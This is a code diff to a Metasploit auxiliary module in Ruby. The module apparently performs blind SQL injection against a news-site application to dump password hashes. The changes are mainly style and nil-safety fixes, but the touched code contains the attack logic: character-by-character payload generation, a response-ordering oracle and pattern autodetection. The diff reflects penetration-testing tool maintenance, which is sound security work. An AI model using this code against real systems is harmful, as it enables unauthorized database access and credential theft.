@@ -109,7 +109,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def blind_size(field, table, condition, size, charset,  patterns = {})
-    str = ""
+    str = ''
     for position in 0..size
       for char in charset.split('')
         payload = select_position(field, table, condition, position + 1, char)
@@ -142,11 +142,12 @@ class MetasploitModule < Msf::Auxiliary
     rescue Rex::ConnectionError, Errno::CONNRESET => e
       print_error("Failed: #{e.class} - #{e.message}")
     end
-    if res and res.code == 200
-      return res.body.index(patterns[:pattern1]) < res.body.index(patterns[:pattern2])
-    else
-      return false
+    if res && res.code == 200
+      unless res.body.index(patterns[:pattern1]).nil? || res.body.index(patterns[:pattern2]).nil?
+        return res.body.index(patterns[:pattern1]) < res.body.index(patterns[:pattern2])
+      end
     end
+    false
   end
 
   def try_autodetect_patterns
@@ -165,10 +166,10 @@ class MetasploitModule < Msf::Auxiliary
       return '', ''
     end
 
-    if res and res.code == 200
+    if res && res.code == 200
       news = res.get_html_document.search('div[@itemtype="http://schema.org/Article"]')
-      pattern1 = defined?(news[0]) ? news[0].search('span[@itemprop="headline"]').text : ''
-      pattern2 = defined?(news[1]) ? news[1].search('span[@itemprop="headline"]').text : ''
+      pattern1 = news[0].nil? ? '' : news[0].search('span[@itemprop="headline"]').text
+      pattern2 = news[1].nil? ? '' : news[1].search('span[@itemprop="headline"]').text
     end
 
     if pattern1.to_s.eql?('') || pattern2.to_s.eql?('')
@@ -183,7 +184,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     pattern1, pattern2 = try_autodetect_patterns
-    if pattern1 == '' or pattern2 == ''
+    if pattern1 == '' || pattern2 == ''
       print_error("Unable to determine pattern, aborting...")
     else
       dump_the_hash(:pattern1 => pattern1, :pattern2 => pattern2)
